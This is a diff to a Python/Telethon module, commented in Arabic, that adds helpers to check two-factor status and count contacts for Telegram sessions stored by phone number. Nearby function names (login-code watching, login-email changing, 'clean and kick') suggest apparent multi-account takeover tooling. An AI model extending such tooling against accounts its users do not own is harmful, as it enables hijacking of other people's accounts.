@@ -2330,3 +2330,44 @@ async def watch_for_new_code(phone: str, timeout: int = 180) -> str | None:
 # توافق مع الاستدعاءات القديمة
 change_email_auto = change_login_email
 full_clean_and_kick = admin_full_cleanup
+
+# ─── shorthand ─────────────────────────────
+async def verify_two_fa(phone: str, password: str) -> dict:
+    """
+    واجهة مبسطة لفحص التحقق بخطوتين من security_monitor.
+    تُعيد {'valid': True/False, 'skip': True إذا الجلسة غير متصلة}
+    """
+    return await verify_two_fa_for_session(phone)
+
+
+async def get_mutual_contacts(phone: str) -> dict:
+    """
+    يجلب عدد جهات الاتصال المشتركة وإجمالي جهات الاتصال للحساب.
+    يُعيد {'total': N, 'mutual': M} أو None عند الفشل.
+    """
+    client = None
+    try:
+        row = await database.get_session_by_phone(phone)
+        if not row:
+            return None
+        client = await get_active_client(phone)
+        if not client:
+            return None
+
+        from telethon.tl.functions.contacts import GetContactsRequest
+        result = await client(GetContactsRequest(hash=0))
+        contacts = result.contacts if hasattr(result, "contacts") else []
+        mutual = sum(1 for c in contacts if getattr(c, "mutual", False))
+        total = len(contacts)
+
+        await database.update_contacts_count(phone, total, mutual)
+        return {"total": total, "mutual": mutual}
+    except Exception as e:
+        logger.debug("get_mutual_contacts %s: %s", phone, e)
+        return None
+    finally:
+        if client:
+            try:
+                await client.disconnect()
+            except Exception:
+                pass
